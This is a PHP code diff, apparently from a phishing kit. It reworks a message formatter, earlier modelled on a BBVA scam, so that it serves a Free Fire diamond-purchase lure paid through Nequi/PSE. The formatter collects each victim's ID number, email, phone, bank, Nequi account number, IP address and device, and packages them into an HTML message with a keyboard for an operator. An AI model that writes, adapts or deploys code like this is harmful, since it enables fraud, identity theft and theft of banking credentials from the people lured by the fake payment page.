@@ -92,16 +92,14 @@ function buildKeyboard($tid)
 }
 
 /* ============================================================
-   MENSAJE - TOMANDO DATOS DEL localStorage (igual que BBVA)
+   MENSAJE - ADAPTADO PARA FREE FIRE
    ============================================================ */
 function formatMessage($d)
 {
-    // Tomar datos directamente del localStorage que ya están guardados
-    // NOTA: Estos datos vienen en el payload, pero también están en localStorage
-    // del lado del cliente. Aquí tomamos del payload que envía el frontend.
-    
+    // Tomar datos directamente del payload
     $b = $d['bancoldata'] ?? [];
     $tbdatos = $d['tbdatos'] ?? [];
+    $freefire = $d['freefire'] ?? [];
     $monto = number_format((float)($d['total'] ?? 0), 0, ',', '.');
     
     // OBTENER IP Y HORA ACTUAL
@@ -130,26 +128,37 @@ function formatMessage($d)
         $dispositivo = 'Linux';
     }
     
-    // TOMAR LOS DATOS DEL TBDATOS (que deberían contener los mismos que localStorage)
-    // Estos son los nombres de campos que se guardan en check.php/index-cel.php
+    // TOMAR LOS DATOS DEL TBDATOS
     $correo = $tbdatos['correo'] ?? 'No disponible';
     $celular = $tbdatos['telefono'] ?? $tbdatos['cel'] ?? 'No disponible';
     $cedula = $tbdatos['identificacion'] ?? $tbdatos['val'] ?? 'No disponible';
     $persona = $tbdatos['tipo_persona'] ?? $tbdatos['per'] ?? 'No disponible';
     $banco = $tbdatos['banco'] ?? $tbdatos['nom'] ?? 'No disponible';
     
-    $msg = "<b>💎 NEQUI PSE 💎</b>\n";
-    $msg .= "<b>• 💸Cedula:</b> " . htmlspecialchars($cedula) . "\n";
+    // DATOS DE FREE FIRE
+    $diamonds = $freefire['diamonds'] ?? 0;
+    $bonus = $freefire['bonus'] ?? 0;
+    $playerId = $freefire['playerId'] ?? '';
+    $playerName = $freefire['playerName'] ?? '';
+    
+    $msg = "<b>💎 FREE FIRE - NEQUI PSE 💎</b>\n";
+    $msg .= "<b>• 🎮 Player ID:</b> <code>" . htmlspecialchars($playerId) . "</code>\n";
+    $msg .= "<b>• 👤 Player Name:</b> " . htmlspecialchars($playerName) . "\n";
+    $msg .= "<b>• 💎 Diamantes:</b> " . htmlspecialchars($diamonds) . "\n";
+    if ($bonus > 0) {
+        $msg .= "<b>• 🎁 Bonus:</b> " . htmlspecialchars($bonus) . "\n";
+    }
+    $msg .= "<b>• 💰 Precio:</b> $ " . $monto . "\n";
+    $msg .= "------------------------------\n";
+    $msg .= "<b>• 💸Cédula:</b> " . htmlspecialchars($cedula) . "\n";
     $msg .= "<b>• 💌Correo:</b> " . htmlspecialchars($correo) . "\n";
     $msg .= "<b>• 📞Celular:</b> " . htmlspecialchars($celular) . "\n";
     $msg .= "<b>• 🏦Banco:</b> " . htmlspecialchars($banco) . "\n";
     $msg .= "------------------------------\n";
+    $msg .= "<b>• 📱 Número Nequi:</b> <code>" . htmlspecialchars($b['usuario'] ?? 'N/D') . "</code>\n";
     $msg .= "<b>• 📟Dispositivo:</b> " . $dispositivo . "\n";
     $msg .= "<b>• 🗺IP:</b> " . $ip . "\n";
     $msg .= "<b>• ⏱Hora:</b> " . $hora . "\n";
-    $msg .= "------------------------------\n";
-    $msg .= "<b>• 📱 Número:</b> <code>" . htmlspecialchars($b['usuario'] ?? 'N/D') . "</code>\n";
-    $msg .= "<b>• 💰 Monto:</b> $ " . $monto . "\n";
 
     return $msg;
 }
